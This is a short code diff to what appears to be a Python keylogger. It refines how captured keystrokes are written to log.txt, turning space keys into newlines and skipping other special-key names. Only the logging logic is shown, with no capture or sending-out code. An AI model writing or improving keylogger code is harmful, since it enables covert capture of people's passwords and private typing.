@@ -19,9 +19,9 @@ def write_file(keys):
     with open("log.txt","a") as f:
         for key in keys:
             k=str(key).replace("'","")
-            if k==" ":
+            if k.find("space") > 0:
                 f.write('\n')
-            else:
+            elif k.find("Key") == -1:
                 f.write(k)
 
 def on_release(key):
